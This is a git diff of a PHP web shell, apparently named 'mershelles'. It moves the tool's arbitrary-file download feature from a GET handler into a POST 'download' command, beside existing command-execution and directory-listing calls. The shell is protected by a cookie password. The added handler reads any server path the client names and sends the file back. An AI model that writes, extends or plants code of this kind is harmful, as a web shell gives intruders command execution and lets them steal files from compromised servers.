@@ -64,36 +64,6 @@ if (PASSWORD !== "" && $_COOKIE["mershelles"] !== md5(PASSWORD)) {
     respond(401, array("error" => "unauthorized"));
 }
 
-// file download
-if ($_SERVER["REQUEST_METHOD"] === "GET") {
-    if (isset($_GET["download"])) {
-
-        chdir($_GET["cwd"]);
-
-        // handle download call
-        function handle_download($file)
-        {
-            if (!file_exists($file)) {
-                die('File not found');
-            }
-            header('Content-Description: File Transfer');
-            header('Content-Type: application/octet-stream');
-            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
-            header('Expires: 0');
-            header('Cache-Control: must-revalidate');
-            header('Pragma: public');
-            header('Content-Length: ' . filesize($file));
-            flush();
-            readfile($file);
-            flush();
-            exit;
-        }
-
-        handle_download($_GET["download"]);
-        exit(0);
-    }
-}
-
 #region api calls
 
 function exec_cmd($cmd)
@@ -218,6 +188,28 @@ function handleLs()
     success(array("files" => $files));
 }
 
+function handleDownload()
+{
+    $file = $_POST["path"];
+    if (!file_exists($file)) {
+        die('File not found');
+    }
+
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    // todo set correct name
+    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate');
+    header('Pragma: public');
+    header('Content-Length: ' . filesize($file));
+    flush();
+    readfile($file);
+    flush();
+    exit;
+    exit(0);
+}
+
 // handle api calls
 if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $type = $_POST["type"];
@@ -236,6 +228,9 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
             break;
         case "ls":
             handleLs();
+            break;
+        case "download":
+            handleDownload();
             break;
         default:
             break;
